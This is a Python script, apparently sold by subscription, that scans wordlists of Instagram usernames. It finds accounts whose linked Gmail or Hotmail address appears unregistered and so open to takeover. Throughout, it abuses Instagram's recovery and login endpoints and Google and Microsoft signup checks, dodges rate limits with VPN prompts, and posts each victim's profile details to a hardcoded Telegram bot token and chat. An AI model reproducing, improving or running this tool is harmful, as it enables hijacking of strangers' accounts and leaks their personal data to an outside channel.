import datetime
an = datetime.datetime.now()
an2 = datetime.datetime(2025, 2, 20, 12, 00, 00)#تحكم بالوقت
if an > an2 or an == an2:
        exit("انتهت مدة تفعيل اشتراكك راسل المطور احمد خان للاشتراك لتفعيله")
else:
        pass
import requests
from random import randrange,choice
from user_agent import generate_user_agent
import os
import sys
from concurrent.futures import ThreadPoolExecutor
import time
from random import *
import random; import string,json
from re import *
uu=[]

E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
S = '\033[2;36m'#سمائي
G = '\033[1;34m' #ازرق فاتح
HH='\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
ge,be,gi,bi,hit=0,0,0,0,0
iid="1427563876"
tok="8092054503:AAGa0OrkwhjUm1YTfuLn9kX5Nzvzfj_Lm04"
os.system('clear')
def rest(email):
    email=email.split('@')[0]
    uh='https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
    hr={
    'X-Pigeon-Session-Id':'2b712457-ffad-4dba-9241-29ea2f472ac5',
    'X-Pigeon-Rawclienttime':'1707104597.347',
    'X-IG-Connection-Speed':'-1kbps',
    'X-IG-Bandwidth-Speed-KBPS':'-1.000',
    'X-IG-Bandwidth-TotalBytes-B':'0',
    'X-IG-Bandwidth-TotalTime-MS':'0',
    'X-IG-VP9-Capable':'false',
    'X-Bloks-Version-Id':'009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
    'X-IG-Connection-Type':'WIFI',
    'X-IG-Capabilities':'3brTvw==',
    'X-IG-App-ID':'567067343352427',
    'User-Agent':'Instagram 100.0.0.17.129 Android (30/11; 320dpi; 720x1448; realme; RMX3231; RMX3231; RMX3231; ar_IQ; 161478664)',
    'Accept-Language':'ar-IQ, en-US',
    'Cookie':'mid=Zbu4xQABAAE0k2Ok6rVxXpTD8PFQ; csrftoken=dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK',
    'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding':'gzip, deflate',
    'Host':'i.instagram.com',
    'X-FB-HTTP-Engine':'Liger',
    'Connection':'keep-alive',
    'Content-Length':'364',
    }
    dah={
    'signed_body':'ef02f559b04e8d7cbe15fb8cf18e2b48fb686dafd056b7c9298c08f3e2007d43.{"_csrftoken":"dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK","adid":"5e7df201-a1ff-45ec-8107-31b10944e25c","guid":"b0382b46-1663-43a7-ba90-3949c43fd808","device_id":"android-71a5d65f74b8fcbc","query":"'f'{email}''"}',

    'ig_sig_key_version':'4',
    }
    k=requests.post(uh,headers=hr,data=dah).text
    try:return  k.split('email":"')[1].split('","status":"ok"}')[0]
    except:return False
def date(Id):
 try:
  if int(Id) >1 and int(Id)<1279000:
   return 2010
  elif int(Id)>1279001 and int(Id)<17750000:
   return 2011
  elif int(Id) > 17750001 and int(Id)<279760000:
   return 2012
  elif int(Id)>279760001 and int(Id)<900990000:
   return 2013
  elif int(Id)>900990001 and int(Id)< 1629010000:
   return 2014
  elif int(Id)>1900000000 and int(Id)<2500000000:
   return 2015
  elif int(Id)>2500000000 and int(Id)<3713668786:
   return 2016
  elif int(Id)>3713668786 and int(Id)<5699785217:
   return 2017
  elif int(Id)>5699785217 and int(Id)<8507940634:
   return 2018
  elif int(Id)>8507940634 and int(Id)<21254029834:
   return 2019
  else:
   return "2020-2023"
 except:
 	return False 	
def info2(email):
    global hit
    hit+=1
    res=rest(email)
    if "@"in email:
       email=email.split("@")[0]
    else:
       pass
    username=email
    try:
        # إرسال طلب للحصول على معلومات الحساب
        url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "X-IG-App-ID": "936619743392459",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive"
        }

        response = requests.get(url, headers=headers)
        
        # تحقق من حالة الاستجابة
        if response.status_code != 200:
           pass

        data = response.json()
        user = data['data']['user']
        

        # استخراج المعلومات المهمة
        user_info = {
            "username": user["username"],
            "Id":user['id'],
            "full_name": user["full_name"],
            "followers": user["edge_followed_by"]["count"],
            "following": user["edge_follow"]["count"],
            "posts": user["edge_owner_to_timeline_media"]["count"],
            "bio": user["biography"],
            "is_private": user["is_private"],
            "is_verified": user["is_verified"],
            "profile_pic_url": user["profile_pic_url"]
        }
        Id=user_info['Id']
        full_name=user_info['full_name']
        followers=user_info['followers']
        following=user_info['following']
        posts=user_info['posts']
        bio=user_info['bio']
        is_verified=user_info['is_verified']
        is_private=user_info['is_private']
        profile_pic_url=user_info['profile_pic_url']
        tlg=f'''
احمد خان صادلك متاح
𝙷𝙸𝚃 ☊ : {hit}
𝙶𝙼𝙰𝙸𝙻 : {email}@hotmail.com
𝚁𝙴𝚂𝚃𝙴𝚃: {res}
𝙽𝙰𝙼𝙴 : {full_name}
𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂:{followers}
𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶: {following}
𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 :{username}
𝙸𝙳 : {Id}
𝙳𝙰𝚃𝙴 : {date(Id)}
𝙿𝚁𝙸𝚅𝙰𝚃𝙴 :{is_private}
𝙱𝙸𝙾 : {bio}
_________________
Py- @AHMED_KHANA        
        
        '''
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(tlg))

    except requests.exceptions.RequestException as e:
        tlg=f'''
احمد خان صادلك متاح
𝙷𝙸𝚃 ☊ : {hit}
𝙶𝙼𝙰𝙸𝙻 : {email}@hotmail.com
𝚁𝙴𝚂𝚃𝙴𝚃: {res}
𝚒𝚗𝚏𝚘 : https://www.instagram.com/{username}?igsh=bXRmcXUyMXVxM3Mx
___________________________
Py- @AHMED_KHANA        
        '''
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(tlg))
def info(email):
    global hit
    hit+=1
    res=rest(email)
    if "@"in email:
       email=email.split("@")[0]
    else:
       pass
    username=email
    try:
        # إرسال طلب للحصول على معلومات الحساب
        url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "X-IG-App-ID": "936619743392459",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive"
        }

        response = requests.get(url, headers=headers)
        
        # تحقق من حالة الاستجابة
        if response.status_code != 200:
           pass

        data = response.json()
        user = data['data']['user']
        

        # استخراج المعلومات المهمة
        user_info = {
            "username": user["username"],
            "Id":user['id'],
            "full_name": user["full_name"],
            "followers": user["edge_followed_by"]["count"],
            "following": user["edge_follow"]["count"],
            "posts": user["edge_owner_to_timeline_media"]["count"],
            "bio": user["biography"],
            "is_private": user["is_private"],
            "is_verified": user["is_verified"],
            "profile_pic_url": user["profile_pic_url"]
        }
        Id=user_info['Id']
        full_name=user_info['full_name']
        followers=user_info['followers']
        following=user_info['following']
        posts=user_info['posts']
        bio=user_info['bio']
        is_verified=user_info['is_verified']
        is_private=user_info['is_private']
        profile_pic_url=user_info['profile_pic_url']
        tlg=f'''
احمد خان صادلك متاح
𝙷𝙸𝚃 ☊ : {hit}
𝙶𝙼𝙰𝙸𝙻 : {email}@gmail.com
𝚁𝙴𝚂𝚃𝙴𝚃: {res}
𝙽𝙰𝙼𝙴 : {full_name}
𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂:{followers}
𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶: {following}
𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 :{username}
𝙸𝙳 : {Id}
𝙳𝙰𝚃𝙴 : {date(Id)}
𝙿𝚁𝙸𝚅𝙰𝚃𝙴 :{is_private}
𝙱𝙸𝙾 : {bio}
_____________________
Py- @AHMED_KHANA       
        
        '''
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(tlg))

    except requests.exceptions.RequestException as e:
        tlg=f'''
احمد خان صادلك متاح
𝙷𝙸𝚃 ☊ : {hit}
𝙶𝙼𝙰𝙸𝙻 : {email}@gmail.com
𝚁𝙴𝚂𝚃𝙴𝚃: {res}
𝚒𝚗𝚏𝚘 : https://www.instagram.com/{username}?igsh=bXRmcXUyMXVxM3Mx
____________________
Py- @AHMED_KHANA      
        '''
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(tlg))

def gmail(email):
    global ge,be,gi,bi
    name = ''.join(choice('abcdefghijklmnopqrstuvwxyz') for i in range(randrange(5,10)))
    birthday = randrange(1980,2010),randrange(1,12),randrange(1,28)
    s = requests.Session()

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://accounts.google.com/',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-browser-channel': 'stable',
        'x-browser-copyright': 'Copyright 2024 Google LLC. All rights reserved.',
        'x-browser-year': '2024',
    }

    params = {
        'biz': 'false',
        'continue': 'https://mail.google.com/mail/u/0/',
        'ddm': '1',
        'emr': '1',
        'flowEntry': 'SignUp',
        'flowName': 'GlifWebSignIn',
        'followup': 'https://mail.google.com/mail/u/0/',
        'osid': '1',
        'service': 'mail',
    }

    response = s.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
    tl=response.url.split('TL=')[1]
    s1= response.text.split('"Qzxixc":"')[1].split('"')[0]
    at = response.text.split('"SNlM0e":"')[1].split('"')[0]
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'"]',
        'x-same-domain': '1',
    }

    params = {
        'rpcids': 'E815hb',
        'source-path': '/lifecycle/steps/signup/name',
        'hl': 'en-US',
        'TL': tl,
        'rt': 'c',
    }

    data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(name,at)

    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
    ).text



    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'"]',
        'x-same-domain': '1',
    }

    params = {
        'rpcids': 'eOY7Bb',
        'source-path': '/lifecycle/steps/signup/birthdaygender',
        'hl': 'en-US',
        'TL': tl,
        'rt': 'c',
    }

    data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3Cf7Nqs-sCAAZfiOnPf4iN_32KOpLfQKL0ADQBEArZ1IBDTUyai2FYax3ViMI2wqBpWShhe-OPRhpMjnm9s14Yu65MknXEBWcyTyF3Jx0pzQAAAeGdAAAAC6cBB7EATZAxrowFF7vQ68oKqx7_sdcR_u8t8CJys-8G4opCIVySwUYaUnm-BovA8aThYLISPNMc8Pl3_B0GnkQJ_W4SIed6l6EcM7QLJ8AXVNAaVgbhsnD7q4lyQnlvR14HRW10oP85EU_bwG1E4QJH1V0KnVS4mIeoqB7zHOuxMuGifv6MB3GghUGTewh0tMN1jaf8yvX804tntlrlxm3OZgCZ2UxgDjUVOKFMv1Y3Txr16jJEJ56-T7qrPCtt6H1kmUvCIl_RDZzbt_sj5OLnbX1UvVA-VgG8-X9AJdvGhCKVhkf3iSkjy6_ZKsZSbsOsMjrm7ggnLdMStIf4AzbJIyMC7q4JMCaDaW_UI9SgquR8mHMpHGRmP7zY-WE47l7uRSpkI6oV93XJZ1zskJsxaDz7sDYHpzEL1RGPnkZU45XkIkwuc1ptU_AiM6SQyoZK7wFnhYxYfDQjSwaC7lOfngr6F2e4pDWkiC96QY4xLr6m2oUoDbyKR3ykccKEECEakFKzS-wSxIt9hK6nw-a9PEpVzhf6uIywZofNCs0KJOhhtv_ReG24DOC6NHX-FweCOkiYtT2sISrm6H8Wr4E89oU_mMWtpnXmhs8PB28SXw42-EdhRPsdcQkgKycOVT_IXwCc4Td9-t7715HP-L2XLk5i05aUrk-sHPPEz8SyL3odOb1SkwQ69bRQHfbPZr858iTDD0UaYWE_Jmb4wlGxYOSsvQ3EIljWDtj69cq3slKqMQu0ZC9bdqEh0p_T9zvsVwFiZThf19JL8PtqlXH5bgoEnPqdSfYbnJviQdUTAhuBPE-O8wgmdwl22wqkndacytncjwGR9cuXqAXUk_PbS-0fJGxIwI6-b7bhD7tS2DUAJk708UK5zFDLyqN6hFtj8AAjNM-XGIEqgTavCRhPnVT0u0l7p3iwtwKmRyAn42m3SwWhOQ6LDv-K2DyLl2OKfFu9Y-fPBh-2K2hIn2tKoGMgVbBR8AsVsYL7L6Bh5JIW7LCHaXNk3oDyHDx5QFaPtMmnIxcfFG90YSEPIgWV2nb67zDDacvvCkiPEQMXHJUcz1tuivaAgCTgW68wNYkUt89KJDhJTSWY2jcPsDIyCnS-SGESyR7mvbkvC3Robo0zVQm6q3Z73si9uqJiPmUGgBLycxUq2A_L3B-Hz35vBm5Oc5Hbe8hJToB03ilQzLa8Kld5BY8_kmmh6kfrOvi07uwfusHv3mKfijE2vaK3v2O2He41hCaOv3ExSfdPKb2V5nPPTw8ryyC5ZwlM_DLCU_k5xONsh4uplpRmydmJcit4aj5Ig0qLVF9MxIWU5xoDlvhKL9jHh-HVgIe-CPp4RMM5BfTxDgtESiF97RWjwrNeKn6Fc4311AdCrfZMcZ0F2JnQsfKAz4H-hoWbrOEVBkPcBt5umJ_iaCm0cQ2XTQMjzAtfWbRe6EGSxbkK-DXBl4EQM-6cnH1139MIHLzNou_Tltbl2HaomCS044CwhRNpe95KuYhM4Fz0Z_8rRjqy48tS_L4kQMX1CtxjBNfd4eUoaAIwAcz3LaL5BwL0DAYcV3xruTTuy6X8zFHe8fAIB9pJ_Pw0YJm3Ye28_tTg5xk0R4EU7_IPIHk6RrtSsG0Rfst3Qi5NRfWFg5h9LlmlHO_EUhdw1wbCICTqbS2A94aIBSCQzn7RmqOTTSIXwgFwnSBRKvoo0v9tKQ2rnMZsXRhzQgxwfmYOq29EUbuHmmWQjpRhfzX1Z6-5gXRPr4-PjrInsTiAi36xDyc8a1yTAhKMwnvf3GNqcK8lqx80VCASvcpYxGIAFl4QghroZbIJXlhccCWVF_xrzsw83QUdoZ5ExWi5f_cLvEXeZssdtan1orOaPJuWXT_0ryzpS9fOGtT68pL4HMAPLPpfwhiZ-wtZQU0oVy6T2L6oP1SIHQDU_QDaMR0MkStXNDj69r5cTDdYZiIbFkvWYeL1afTEljx1i2n2KKnDmpJfx2HeGCSZBMKZey24z_LDLA7MyJ2VBo4Zvmm23dwhWHOly56w9ul4sWzpHqgsqmKynRoaq9SXKrrmbR3f2GKBHSvy3Jm0Ln52zwIQfFSXpOjGXq5pkOXlvQc6MPuV3zADVmcUZs6ywI-ER3PkAaA-f-zG-ke_6jvOzGp6WF8UxnIk5tq3tus_R5pUjVQFjk6qZtWOP8VZd1TeJ54Oo_ywj8YAYCphkDtFYRMZSubmnI-F9LLlAfOiDwQ7r-iNvp8psduy9xrWdIpE_l23Y_qYJPHwvtopL3lB7juqEiFkhUts7NEugyWY-m6-9oEgsOY0lM4746V-XUxSeS7UkZkQZZM19g7GkWjJ61D98i0m2u_UYLnyDFQEaIxVhFcmS1Zq7OMsKm_gYpMt4LuD1F3N__Vj05QNyI59QNQADODveiHpfVva9Cd2AzBm9AKGwU4xDS_FyX3XRsRbfQFtqNzPf1LAERHlnHFn%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(birthday[0],birthday[1],birthday[2],at)

    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
    ).text



    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'"]',
        'x-same-domain': '1',
    }

    params = {
        'rpcids': 'NHJMOd',
        'source-path': '/lifecycle/steps/signup/username',
        'hl': 'en-US',
        'TL': tl,
        'rt': 'c',
    }
    email=email.split("@")[0]

    data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)

    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
    ).text
    if 'password' in response:
        info(email)
        ge+=1
        sys.stdout.write(f'''\r{F}Hits : {M}{ge}{Z} | Bad Instgram: {M}{bi}{X} |Bad Email : {M}{be}{C} | Good Instgram : {M}{gi}'''),sys.stdout.flush()
    else:
        be+=1
        sys.stdout.write(f'''\r{F}Hits : {M}{ge}{Z} | Bad Instgram: {M}{bi}{X} |Bad Email : {M}{be}{C} | Good Instgram : {M}{gi}'''),sys.stdout.flush()

def hott(email):
	global ge,be,gi,bi
	reqz=requests.Session();headers = {
	"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
	"Host": "signup.live.com",
	"Connection": "keep-alive",
	"X-Requested-With": "XMLHttpRequest"
	    };url="https://signup.live.com/signup.aspx?lic=1";response=reqz.get(url, headers=headers)
	apiCanary = search("apiCanary\":\"(.+?)\",", str(response.content)).group(1)
	apiCanary = str.encode(apiCanary).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii");url  = "https://signup.live.com/API/CheckAvailableSigninNames";json = {
	"signInName": email,
	"includeSuggestions": True};res = reqz.post(url, headers={
	"Content-Type":"application/x-www-form-urlencoded; charset=utf-8",
	"canary":apiCanary
	}, json=json)
	if res.json()["isAvailable"]==True:      
		info2(email);ge+=1
		sys.stdout.write(f'''\r{F}Hits : {M}{ge}{Z} | Bad Instgram: {M}{bi}{X} |Bad Email : {M}{be}{C} | Good Instgram : {M}{gi}'''),sys.stdout.flush()
	else:
		be+=1
		sys.stdout.write(f'''\r{F}Hits : {M}{ge}{Z} | Bad Instgram: {M}{bi}{X} |Bad Email : {M}{be}{C} | Good Instgram : {M}{gi}'''),sys.stdout.flush()
def block(email):
   global ge,be,gi,bi
   import requests
   import random
   from uuid import uuid4
   uid=str(uuid4())
   agents = [
    'Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)',
    'Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)',
    'Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)',
    'Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)',
    'Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)',
    'Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)',
    'Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)',
    'Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)',
    'Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)',
    'Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)',
    'Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)']
   agent = random.choice(agents)
   url = 'https://i.instagram.com/api/v1/accounts/login/'
   headers = {
    'Content-Length': '339',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Host': 'i.instagram.com',
    'Connection': 'Keep-Alive',
    'User-Agent': agent,
    'Cookie': f'''mid={uid}''',
    'Cookie2': '$Version=1',
    'Accept-Language': 'ar-EG, en-US',
    'X-IG-Connection-Type': 'MOBILE(LTE)',
    'X-IG-Capabilities': 'AQ==',
    'Accept-Encoding': 'gzip' }
   data = {
    'login_attempt_countn': '0',
    '_csrftoken': 'missing',
    'from_reg': 'false',
    'device_id': uid,
    'username': email,
    'password': '@Hamody666',
    'uuid': uid }
   req = requests.post(url, headers=headers, data=data).text
   if "invalid_user"in req:
        bi+=1
        sys.stdout.write(f'''\r[{F}Hits : {M}{ge}{Z} | Bad Instgram: {M}{bi}{X} | Bad Enail: {M}{be}{C} | Good Insta: {M}{gi}]'''),sys.stdout.flush()
   elif "Please wait a few minutes before you try again."in req:
      os.system('cls'if os.name=='nt'else'clear')
      print("VPN 8 8 8 8 8 8 8 8 8 8 8888 8 8 8 8 88 ")
   elif "bad_password"in req:
        gmail(email)
        gi+=1
        
        sys.stdout.write(f'''\r[{F}Hits : {M}{ge}{Z} | Bad Instgram: {M}{bi}{X} | Bad Enail: {M}{be}{C} | Good Insta: {M}{gi}]'''),sys.stdout.flush()
def insta2(email):
    global ge,be,gi,bi
    headers = {
        'X-Pigeon-Session-Id':'2b712457-ffad-4dba-9241-29ea2f472ac5',
        'X-Pigeon-Rawclienttime':'1707104597.347',
        'X-IG-Connection-Speed':'-1kbps',
        'X-IG-Bandwidth-Speed-KBPS':'-1.000',
        'X-IG-Bandwidth-TotalBytes-B':'0',
        'X-IG-Bandwidth-TotalTime-MS':'0',
        'X-IG-VP9-Capable':'false',
        'X-Bloks-Version-Id':'009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
        'X-IG-Connection-Type':'WIFI',
        'X-IG-Capabilities':'3brTvw==',
        'X-IG-App-ID':'567067343352427',
        'User-Agent':str(generate_user_agent()),
        'Accept-Language':'ar-IQ, en-US',
        'Cookie':'mid=Zbu4xQABAAE0k2Ok6rVxXpTD8PFQ; csrftoken=dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK',
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding':'gzip, deflate',
        'Host':'i.instagram.com',
        'X-FB-HTTP-Engine':'Liger',
        'Connection':'keep-alive',
        'Content-Length':'364',
    }
    data = {
        'signed_body':'ef02f559b04e8d7cbe15fb8cf18e2b48fb686dafd056b7c9298c08f3e2007d43.{"_csrftoken":"dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK","adid":"5e7df201-a1ff-45ec-8107-31b10944e25c","guid":"b0382b46-1663-43a7-ba90-3949c43fd808","device_id":"android-71a5d65f74b8fcbc","query":"'f'{email}''"}',

        'ig_sig_key_version':'4',
    }	
    try:
        re = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data).text
    except Exception as e:""
   # print(re)
    if ('"can_recover_with_code"')in re:

        hott(email)
        gi+=1
        sys.stdout.write(f'''\r{F}Hits : {M}{ge}{Z} | Bad Instgram: {M}{bi}{X} |Bad Email : {M}{be}{C} | Good Instgram : {M}{gi}'''),sys.stdout.flush()
    elif ('"spam":true')in re:
       os.system('cls'if os.name=='nt'else'clear')
       print("RUN VPN : ")
    else:
        bi+=1
        sys.stdout.write(f'''\r{F}Hits : {M}{ge}{Z} | Bad Instgram: {M}{bi}{X} |Bad Email : {M}{be}{C} | Good Instgram : {M}{gi}'''),sys.stdout.flush()
def insta(email):
    global ge,be,gi,bi
    headers = {
        'X-Pigeon-Session-Id':'2b712457-ffad-4dba-9241-29ea2f472ac5',
        'X-Pigeon-Rawclienttime':'1707104597.347',
        'X-IG-Connection-Speed':'-1kbps',
        'X-IG-Bandwidth-Speed-KBPS':'-1.000',
        'X-IG-Bandwidth-TotalBytes-B':'0',
        'X-IG-Bandwidth-TotalTime-MS':'0',
        'X-IG-VP9-Capable':'false',
        'X-Bloks-Version-Id':'009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
        'X-IG-Connection-Type':'WIFI',
        'X-IG-Capabilities':'3brTvw==',
        'X-IG-App-ID':'567067343352427',
        'User-Agent':str(generate_user_agent()),
        'Accept-Language':'ar-IQ, en-US',
        'Cookie':'mid=Zbu4xQABAAE0k2Ok6rVxXpTD8PFQ; csrftoken=dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK',
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding':'gzip, deflate',
        'Host':'i.instagram.com',
        'X-FB-HTTP-Engine':'Liger',
        'Connection':'keep-alive',
        'Content-Length':'364',
    }
    data = {
        'signed_body':'ef02f559b04e8d7cbe15fb8cf18e2b48fb686dafd056b7c9298c08f3e2007d43.{"_csrftoken":"dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK","adid":"5e7df201-a1ff-45ec-8107-31b10944e25c","guid":"b0382b46-1663-43a7-ba90-3949c43fd808","device_id":"android-71a5d65f74b8fcbc","query":"'f'{email}''"}',

        'ig_sig_key_version':'4',
    }	
    try:
        re = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data).text
    except Exception as e:""

    if ('"can_recover_with_code"')in re:
        gmail(email)
        gi+=1
        sys.stdout.write(f'''\r{F}Hits : {M}{ge}{Z} | Bad Instgram: {M}{bi}{X} |Bad Email : {M}{be}{C} | Good Instgram : {M}{gi}'''),sys.stdout.flush()
    elif ('"spam":true')in re:
       os.system('cls'if os.name=='nt'else'clear')
       print(" أنت محصور قم بتشغيل VPN 😂")
       block(email)
    else:
        bi+=1
        sys.stdout.write(f'''\r{F}Hits : {M}{ge}{Z} | Bad Instgram: {M}{bi}{X} |Bad Email : {M}{be}{C} | Good Instgram : {M}{gi}'''),sys.stdout.flush()
def admin_gm(name):
    try:
         file = open(name,'r').read().splitlines()
    except:
        os.system('clear' if os.name == 'posix' else 'cls')
        print("السته غير موجوده  ! "	)
    with ThreadPoolExecutor(max_workers=15)as executor:
        futures=[executor.submit(insta,user+"@gmail.com")for user in file]
        for future in futures:
            future.result()
def admin_hot(name):
    try:
         file = open(name,'r').read().splitlines()
    except:
        os.system('clear' if os.name == 'posix' else 'cls')
        print("السته غير موجوده  ! "	)
    with ThreadPoolExecutor(max_workers=15)as executor:
        futures=[executor.submit(insta2,user+"@hotmail.com")for user in file]
        for future in futures:
            future.result()
